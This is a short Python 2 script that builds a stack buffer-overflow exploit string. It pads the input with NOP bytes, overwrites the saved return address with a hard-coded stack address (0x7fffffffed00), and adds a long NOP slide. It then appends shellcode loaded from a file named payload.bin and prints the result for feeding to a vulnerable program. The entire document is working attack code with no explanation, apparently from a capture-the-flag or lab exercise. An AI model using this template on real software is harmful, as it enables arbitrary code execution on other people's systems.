payload_file = open("payload.bin", "rb")
payload = payload_file.read()
payload_file.close()

padding = "\x90" * (128 + 8)

# 0x7fffffffed00
rip = "\x00\xed\xff\xff\xff\x7f\x00\x00"

nop_slide = "\x90" * 2000

print padding + rip + nop_slide + payload
